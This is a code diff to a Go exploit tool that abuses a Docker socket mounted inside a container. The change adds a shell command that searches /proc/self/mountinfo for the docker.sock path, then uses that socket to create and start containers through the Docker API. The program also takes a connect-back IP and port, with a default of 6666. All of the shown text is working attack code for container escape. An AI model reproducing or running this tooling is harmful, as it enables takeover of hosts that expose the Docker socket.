@@ -8,6 +8,7 @@ import (
 	"log"
 	"net"
 	"net/http"
+	"os/exec"
 	"strings"
 )
 
@@ -37,6 +38,18 @@ func sendMessage(httpClient *http.Client, url string, method string, postData st
 type ContainerCreationStatus struct {
 	Id string `json:Id`
 }
+
+func getDockerSockPath()(string,error){
+	cmd := `if  cat /proc/self/mountinfo | grep -q '^[^[:space:]]*[[:space:]][^[:space:]]*[[:space:]][^[:space:]]*[[:space:]]docker.sock'; then
+	   path=$(cat /proc/self/mountinfo | grep '^[^[:space:]]*[[:space:]][^[:space:]]*[[:space:]][^[:space:]]*[[:space:]]docker.sock' | cut -d' ' -f 5)
+       echo $path
+	 else
+	   exit 1
+	 fi`
+	out, err := exec.Command("sh", "-c", cmd).Output()
+	return strings.TrimSuffix(string(out), "\n"),err
+}
+
 func createContainer(httpClient *http.Client, postData string){
 	bodyBytes := sendMessage(httpClient, "http://v1.27/containers/create", "POST", postData)
 	fmt.Println("[*] Container has been created, waiting to start...")
@@ -65,10 +78,16 @@ func mainfunc(ipToConnect string, port string) {
 		port = "6666"
 	}
 
+	dockerSockPath, err := getDockerSockPath()
+	if err != nil {
+		fmt.Printf("[!] Docker sock is not mounted in the container. Ending exploit\n")
+		return
+	}
+
 	httpc := http.Client{
 		Transport: &http.Transport{
 			DialContext: func(_ context.Context, _, _ string) (net.Conn, error) {
-				return net.Dial("unix", "/var/run/docker.sock")
+				return net.Dial("unix", dockerSockPath)
 			},
 		},
 	}
@@ -85,8 +104,7 @@ func mainfunc(ipToConnect string, port string) {
 	//io.Copy(os.Stdout, response.Body)
 }
 
-/*
+
 func main(){
-	mainfunc("192.168.1.1", "6666")
-}
-*/
+	//mainfunc("192.168.1.1", "6666")
+	}
